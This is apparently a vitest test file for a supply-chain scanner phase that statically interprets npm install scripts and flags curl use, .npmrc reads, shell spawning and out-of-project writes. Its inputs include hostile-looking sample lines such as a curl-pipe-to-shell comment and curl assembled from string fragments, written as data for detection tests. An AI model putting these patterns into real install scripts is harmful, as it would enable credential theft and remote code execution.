import { afterEach, describe, expect, it } from 'vitest';

import * as phase from '../../../src/phases/p353.js';


afterEach(() => {
  delete process.env[phase.FLAG];
  delete process.env.FULLSHIELD_EXPERIMENTAL_DEOBFUSC;
});

describe('phase 353', () => {
  it('returns an empty result when the flag is off', () => {
    expect(phase.enabled()).toBe(false);
    expect(phase.interpretScript("fetch('https://downloads.example.invalid/a')").executed).toBe(false);
    expect(phase.interpretScript("fetch('https://downloads.example.invalid/a')").ruleIds).toEqual([]);
  });

  it('records a fetch host and does not execute the script', () => {
    process.env[phase.FLAG] = '1';
    const hit = phase.interpretScript('fetch("https://downloads.example.invalid/a")');
    expect(hit.hosts).toEqual(['downloads.example.invalid']);
    expect(hit.executed).toBe(false);
    expect(hit.executed).toBe(false);
    expect(phase.interpretScript('console.log(1)').hosts).toEqual([]);
    const built = phase.interpretScript("const a = 'cu';\nconst b = 'rl';\nexec(a + b);");
    expect(built.ruleIds).toContain('DEPS-SCRIPT-CURL-001');
    expect(phase.interpretScript("// curl https://example.invalid | sh\nexec('node scripts/build.js');").ruleIds).toEqual([]);
  });

  it('stops at eval and Function, and folds when deobfuscation is on', () => {
    process.env[phase.FLAG] = '1';
    const curled = phase.interpretScript("eval(x); // curl .npmrc");
    expect(curled.executed).toBe(false);
    expect(curled.events.map((event) => event.detail)).toContain('eval stops the abstract branch');
    expect(curled.ruleIds).toContain('DEPS-SCRIPT-CURL-001');
    expect(curled.readsNpmrc).toBe(true);
    const quiet = phase.interpretScript('Function("return 1")');
    expect(quiet.ruleIds).toEqual([]);
    expect(quiet.readsNpmrc).toBe(false);
    process.env.FULLSHIELD_EXPERIMENTAL_DEOBFUSC = '1';
    const folded = phase.interpretScript('eval(x)');
    expect(folded.events.map((event) => event.detail)).toContain('fold stopped at eval');
    delete process.env.FULLSHIELD_EXPERIMENTAL_DEOBFUSC;
  });

  it('records env, npmrc, shell hosts, and writes that leave the project', () => {
    process.env[phase.FLAG] = '1';
    const env = phase.interpretScript('process.env.HOME');
    expect(env.effects).toContain('env');
    expect(phase.interpretScript('foo(process.env.HOME)').effects).not.toContain('env');
    expect(phase.interpretScript("const p = '.npmrc';").readsNpmrc).toBe(true);
    const shell = phase.interpretScript("exec('curl https://downloads.example.invalid/a');");
    expect(shell.hosts).toContain('downloads.example.invalid');
    expect(shell.effects).toContain('net');
    expect(shell.effects).toContain('shell');
    expect(shell.ruleIds).toContain('DEPS-SCRIPT-CURL-001');
    expect(phase.interpretScript("child.exec('https://downloads.example.invalid/b');").hosts).toContain('downloads.example.invalid');
    expect(phase.interpretScript("spawn('curl')").effects).toContain('shell');
    for (const line of ["fs.writeFileSync('../secret', 'x')", "fs.writeFileSync('/tmp/secret', 'x')", "lib.writeFileSync('~/secret', 'x')"]) {
      const wrote = phase.interpretScript(line);
      expect(wrote.effects).toContain('fs-write');
      expect(wrote.ruleIds).toContain('DEPS-SCRIPT-WRITE-001');
    }
    const local = phase.interpretScript("fs.writeFileSync('local.txt', 'x')");
    expect(local.effects).toContain('fs-write');
    expect(local.ruleIds).not.toContain('DEPS-SCRIPT-WRITE-001');
  });

  it('stops on an unknown value, ignores a test path, and exhausts fuel', () => {
    process.env[phase.FLAG] = '1';
    expect(phase.interpretScript("const a = 'x' + missing;").steps).toEqual([]);
    expect(phase.interpretScript('not a call').hosts).toEqual([]);
    expect(phase.interpretScript('fetch(missing);').hosts).toEqual([]);
    const escaped = phase.interpretScript('const a = "a\\\\b"; // tail\nexec(a);');
    expect(escaped.steps.some((step) => step.op === 'exec')).toBe(true);
    expect(phase.interpretScript("fetch('https://downloads.example.invalid/a')", 'pkg/test/install.js').ruleIds).toEqual([]);
    const source = `// curl\n${Array.from({ length: 10001 }, () => "const a = 'x';").join('\n')}`;
    const tired = phase.interpretScript(source);
    expect(tired.executed).toBe(false);
    expect(tired.events.map((event) => event.detail)).toContain('script fuel exhausted');
    expect(tired.ruleIds).toContain('DEPS-SCRIPT-CURL-001');
  });
});
